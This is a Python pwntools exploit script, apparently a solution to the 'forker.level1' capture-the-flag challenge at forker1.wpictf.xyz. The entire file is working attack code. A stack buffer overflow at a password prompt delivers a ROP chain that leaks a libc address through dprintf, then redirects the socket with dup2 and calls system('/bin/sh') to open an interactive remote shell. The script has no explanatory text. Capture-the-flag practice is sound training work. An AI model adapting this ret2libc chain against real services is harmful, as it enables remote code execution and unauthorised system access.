from pwn import *

target = ELF('forker.level1')
libc = ELF('libc-2.26.so')

context.log_level = 'debug'

POP_RDI = 0x400c13
POP_RSI_R15 = 0x400c11



r = remote('forker1.wpictf.xyz', 31337)

fd = 4

payload = ''
payload += 'A' * 0x4c + '\x58'
payload += p64(POP_RDI)
payload += p64(fd)
payload += p64(POP_RSI_R15)
payload += p64(target.got['dprintf'])
payload += p64(0)
payload += p64(target.plt['dprintf'])

r.sendlineafter('Password:', payload)

LIBC_BASE = u64(r.recv(6) + '\x00\x00') - libc.symbols['dprintf']
OFFSET_BIN_SH = 0x1a3f20

r.close()



r = remote('forker1.wpictf.xyz', 31337)

fd = 4

payload = ''
payload += 'A' * 0x4c + '\x58'
payload += p64(POP_RDI)
payload += p64(fd)
payload += p64(POP_RSI_R15)
payload += p64(0)
payload += p64(0)
payload += p64(LIBC_BASE + libc.symbols['dup2'])
payload += p64(POP_RDI)
payload += p64(fd)
payload += p64(POP_RSI_R15)
payload += p64(1)
payload += p64(0)
payload += p64(LIBC_BASE + libc.symbols['dup2'])
payload += p64(POP_RDI)
payload += p64(fd)
payload += p64(POP_RSI_R15)
payload += p64(2)
payload += p64(0)
payload += p64(LIBC_BASE + libc.symbols['dup2'])
payload += p64(POP_RDI)
payload += p64(LIBC_BASE + OFFSET_BIN_SH)
payload += p64(LIBC_BASE + libc.symbols['system'])

r.sendlineafter('Password:', payload)

r.interactive()
